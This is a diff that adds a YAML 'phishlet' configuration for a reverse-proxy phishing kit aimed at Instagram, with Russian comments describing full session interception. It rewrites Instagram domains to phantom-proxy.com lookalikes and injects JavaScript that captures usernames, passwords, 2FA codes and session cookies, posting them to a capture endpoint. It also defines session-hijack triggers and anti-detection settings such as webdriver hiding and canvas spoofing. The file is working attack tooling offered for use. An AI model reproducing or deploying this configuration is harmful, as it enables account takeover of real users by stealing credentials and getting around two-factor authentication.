@@ -1,0 +1,205 @@
+# ============================================================================
+# Instagram Phishlet
+# Полный перехват сессий Instagram (Meta)
+# ============================================================================
+
+id: instagram
+name: Instagram (Meta)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Instagram:
+  - Вход по username/email
+  - 2FA подтверждение
+  - Перехват сессий
+  - Перехват данных профиля
+
+target:
+  primary: "www.instagram.com"
+  secondary:
+    - "instagram.com"
+    - "m.instagram.com"
+    - "i.instagram.com"
+    - "business.instagram.com"
+    - "help.instagram.com"
+
+sub_filters:
+  - type: "domain"
+    from: "www.instagram.com"
+    to: "www.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "instagram.com"
+    to: "phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "m.instagram.com"
+    to: "m.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "i.instagram.com"
+    to: "api.phantom-proxy.com"
+    priority: 4
+
+  - type: "domain"
+    from: "static.cdninstagram.com"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Instagram phishlet loaded');
+    
+    const capture = {
+      captureCredentials: function(form) {
+        const username = form.querySelector('input[type="text"]')?.value || 
+                         form.querySelector('input[name="username"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (username || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'instagram_credentials',
+              username: username,
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      capture2FA: function(code) {
+        if (code && code.length >= 6) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'instagram_2fa',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      captureSession: function() {
+        const cookies = {
+          sessionid: this.getCookie('sessionid'),
+          ds_user_id: this.getCookie('ds_user_id'),
+          csrftoken: this.getCookie('csrftoken'),
+          mid: this.getCookie('mid'),
+          ig_did: this.getCookie('ig_did'),
+          rur: this.getCookie('rur')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'instagram_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    document.addEventListener('submit', function(e) {
+      capture.captureCredentials(e.target);
+    }, true);
+    
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        if (name.includes('security_code') || name.includes('otp')) {
+          if (e.target.value.length >= 6) {
+            capture.capture2FA(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    window.addEventListener('load', function() {
+      capture.captureSession();
+    });
+    
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+  })();
+
+triggers:
+  - name: "instagram_login"
+    path_regex: "/accounts/login|/login"
+    actions:
+      - type: "capture_form"
+        fields: ["username", "email", "password"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "instagram_2fa"
+    path_regex: "/challenge|/security|/two_factor"
+    actions:
+      - type: "capture_form"
+        fields: ["security_code", "otp", "code"]
+      - type: "wait_for_input"
+        timeout: 180
+        
+  - name: "instagram_main"
+    host_regex: "www.instagram.com"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["sessionid", "ds_user_id", "csrftoken", "mid", "ig_did", "rur"]
+      - type: "session_hijack"
+        enabled: true
+
+cookies:
+  critical:
+    - "sessionid"
+    - "ds_user_id"
+    - "csrftoken"
+    - "mid"
+    - "ig_did"
+    - "rur"
+    
+  session:
+    - "ig_nrcb"
+    - "wd"
+    
+  additional:
+    - "fbsr"
+    - "fbm"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/instagram/"
